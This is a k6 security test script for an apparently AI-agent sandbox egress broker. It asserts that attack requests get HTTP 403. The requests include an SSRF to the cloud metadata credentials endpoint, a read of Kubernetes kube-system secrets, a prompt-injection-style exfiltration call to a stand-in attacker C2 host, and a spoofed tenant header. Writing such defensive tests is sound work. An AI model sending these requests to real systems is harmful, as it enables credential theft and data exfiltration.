import http from 'k6/http';
import { check } from 'k6';
import { Rate, Trend } from 'k6/metrics';

// Custom Security Metrics
export const securityPassRate = new Rate('sandbox_security_assertions_passed');
export const brokerFilterLatency = new Trend('broker_l7_filter_duration_ms');
export const brokerAuthLatency = new Trend('broker_token_injection_duration_ms');

export const options = {
  scenarios: {
    security_fuzzing: {
      executor: 'constant-arrival-rate',
      rate: Number(__ENV.QPS) || 20,
      timeUnit: '1s',
      duration: __ENV.AUDIT_DURATION || '15s',
      preAllocatedVUs: 10,
      maxVUs: 30,
    },
  },
  thresholds: {
    // 100% of security checks (403 blocks + zero token leakage) MUST pass
    sandbox_security_assertions_passed: ['rate==1.0'],
    broker_l7_filter_duration_ms: ['p(95)<50'],
    broker_token_injection_duration_ms: ['p(95)<50'],
  },
};

const BROKER_URL = __ENV.EGRESS_BROKER_URL || 'http://egress-broker.sandbox-egress-system.svc.cluster.local:8080';
const K8S_API_HOST = __ENV.KUBERNETES_SERVICE_HOST || '10.96.0.1';
const K8S_API_PORT = __ENV.KUBERNETES_SERVICE_PORT || '443';
const INGRESS_URL = __ENV.TARGET_URL;
if (!INGRESS_URL) {
  throw new Error('FATAL: TARGET_URL environment variable is required. Example: TARGET_URL=http://$(minikube ip):80 k6 run ...');
}

export default function () {
  const rand = Math.random();

  if (rand < 0.25) {
    // Vector 1: SSRF to Cloud Metadata Service via Egress Broker (Must be 403 Blocked)
    const res = http.get(`${BROKER_URL}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`);
    const ok = check(res, {
      '[T1-SSRF] Broker blocks IMDS 169.254.169.254 with HTTP 403': (r) => r.status === 403,
      '[T1-SSRF] Response confirms L7 policy block': (r) => r.body && r.body.includes('BLOCKED_BY_L7_POLICY'),
    });
    securityPassRate.add(ok);
    brokerFilterLatency.add(res.timings.duration);

  } else if (rand < 0.50) {
    // Vector 2: K8s API Control Plane Lateral Movement via Egress Broker (Must be 403 Blocked)
    const res = http.get(`${BROKER_URL}/proxy?url=https://${K8S_API_HOST}:${K8S_API_PORT}/api/v1/namespaces/kube-system/secrets`);
    const ok = check(res, {
      '[T2-K8S-API] Broker blocks K8s API internal service IP with HTTP 403': (r) => r.status === 403,
    });
    securityPassRate.add(ok);
    brokerFilterLatency.add(res.timings.duration);

  } else if (rand < 0.75) {
    // Vector 3: Prompt Injection C2 Exfiltration Attempt (Must be 403 Blocked)
    const res = http.get(`${BROKER_URL}/proxy?url=http://evil-c2.attacker.example.com/exfiltrate?secret=stolen`);
    const ok = check(res, {
      '[T6-C2-EGRESS] Broker blocks unwhitelisted C2 domain with HTTP 403': (r) => r.status === 403,
    });
    securityPassRate.add(ok);
    brokerFilterLatency.add(res.timings.duration);

  } else if (rand < 0.90) {
    // Vector 4: Zero-In-Guest Credential Injection & No Raw Secret Leakage
    const res = http.get(`${BROKER_URL}/github-api/repo-metadata`);
    const ok = check(res, {
      '[T4/T6C-CRED-BROKER] Broker returns HTTP 200': (r) => r.status === 200,
      '[T4/T6C-CRED-BROKER] Token injected on-the-wire': (r) => r.body && r.body.includes('"token_injected": true'),
      '[T4/T6C-CRED-BROKER] Raw secret NEVER leaked in response body': (r) => r.body && !r.body.includes('ghs_ephemeral_'),
    });
    securityPassRate.add(ok);
    brokerAuthLatency.add(res.timings.duration);

  } else {
    // Vector 5: Cross-Tenant Spoofed Sandbox ID on Ingress Router (Must NOT return 200 OK)
    const res = http.get(`${INGRESS_URL}/manifest.json`, {
      headers: {
        'Host': 'sandbox.127.0.0.1.nip.io',
        'X-Sandbox-ID': 'spoofed-unauthorized-tenant-9999',
        'X-Sandbox-Namespace': 'agent-sandbox',
        'X-Sandbox-Port': '8080',
      },
    });
    const ok = check(res, {
      '[TENANT-ISOLATION] Spoofed X-Sandbox-ID rejected by router (non-200)': (r) => r.status !== 200,
    });
    securityPassRate.add(ok);
  }
}
